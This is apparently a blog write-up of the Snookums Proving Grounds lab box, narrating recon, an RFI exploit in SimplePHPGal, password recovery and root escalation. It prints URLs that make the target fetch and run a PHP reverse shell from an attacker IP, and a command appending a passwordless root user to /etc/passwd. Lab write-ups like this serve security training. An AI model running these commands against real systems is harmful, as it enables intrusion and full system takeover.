---
layout: writeup
title: Snookums - Proving Grounds
date: 2024-08-01 13:32:20 +0300
description: A Writeup of the Snookums Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi]
---

Today I'll be doing a walkthrough for Snookums, an Intermediate Proving Grounds box I saw on the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). As usual, I get started with an nmap scan and a quick search of the IP address in the URL bar in case there is a web server on port 80. And there is:

![Snookums_1.png](/assets/images/Snookums/Snookums_1.png){: .responsive-image}

It looks like an image upload application, though I can't find any immediate way to upload it. I do a directory search and check the nmap scan results. 

```
Nmap scan report for 192.168.153.58
Host is up (0.21s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

I couldn't get anywhere with 21 (FTP allowed anonymous logon by kept hanging), 445 (no interesting shares on SMB), or 3306 (couldn't access from my IP - more on that later). In the directory search, the only thing that really sticks out is the README.txt file. 

![Snookums_2.png](/assets/images/Snookums/Snookums_2.png){: .responsive-image}

This comes in handy because it makes it easier to find exploits. For example, when searching "Simple PHP" exploit-db returns 74 entries, but "Simple PHP Photo" returns 0. "SimplePHPGal" however, returns one, an RFI exploit. I use it to check the contents of `etc/passwd` using this search: `http://192.168.153.58/image.php?img=/etc/passwd`. This shows us a `michael` user, but unfortunately I can't find any ssh keys or a local.txt in michael's /home folder. I also tried looking around the server for config files, but I couldn't find anything at all. I also tried including a reverse shell from my machine, but I couldn't get it to execute, in retrospect perhaps because of the port (4444): `http://192.168.153.58/image.php?img=http://192.168.45.235/ivan4444.php`

 I started googling around for more, and I found this [exploit](https://github.com/beauknowstech/SimplePHPGal-RCE.py). I couldn't get it working either, but eventually I realized that the target would download the reverse shell when I served it from port 80, but not from port 4444 or 8080. I figured there must be some kind of firewall, so I served it from port 80 and had it call back to port 3306, assuming that would work because there is a MySQL server on the target. That worked.

After gaining access to the machine, I searched around and used my favorite autoenum scripts, linpeas and lse, but I didn't see anything particularly interesting for the `apache` user I had the shell for. I also noticed that I couldn't read michael's home folder, suggesting that maybe I would need to switch to that user prior to switching to root. Otherwise switching to root would be the only way to get both flags, unusual for a lab like this. I started manually enumerating the /var folder to see if I could find anything, and I found this in `/var/www/html/db.php`:

![Snookums_3.png](/assets/images/Snookums/Snookums_3.png){: .responsive-image}

A root password - nice. Of course I tried `su root` immediately, but it didn't work, so I checked out the mysql databse with`mysql -u root -p` using the password above. I enumerated the databases and tables, ultimately using table: `SimplePHPGal`to  `SELECT * FROM users;` and find this: 

![Snookums_4.png](/assets/images/Snookums/Snookums_4.png){: .responsive-image}

We know michael is a user on the box, so that's a start. These look like base64, but when I decoded the password associated with the user, it still looked like base64, so I decoded it again and got what looked more like a password. See the second line in the top box is the decoded hash of the first line (shown in the second box):

![Snookums_5.png](/assets/images/Snookums/Snookums_5.png){: .responsive-image}

We are able to use this to `su michael` and even ssh. This get us the local.txt flag from michael's home folder. Because I got a new user, I run linpeas and lse again. Linpeas shows that `/etc/passwd` is writable. 

![Snookums_6.png](/assets/images/Snookums/Snookums_6.png){: .responsive-image}

We can use that to add a new user called `pop2`: `echo "pop2::0:0::/root:/bin/bash" >> /etc/passwd`. Then we can switch to pop2 and gain root access:

![Snookums_7.png](/assets/images/Snookums/Snookums_7.png){: .responsive-image}

And boom, we're done. Lessons learned: I need to do a better job of using ports that I know the target can use. For some of these boxes it doesn't matter at all, but it's been the sole reason certain exploits haven't worked on a few of them, and it just eats up so much time. Other than that, it just shows that it's important to do manual enumeration and re-enumerate once you get a new user. I liked this one. 

Update: I went back and retried the initial exploit from exploit-db. It works if you use two different ports that the target can connect to. You have to use two different ports, one to serve the reverse shell, and a different one for the shell itself, because the web server executes the file automatically. You can't use port 80 to serve, then close the simple server, then execute the shell which uses port 80. Working example using the Ivan Sincek shell on port 80 served from port 3306:
`http://192.168.153.58/image.php?img=http://192.168.45.235:3306/ivan80.php
Glad I went back to confirm, now I know. 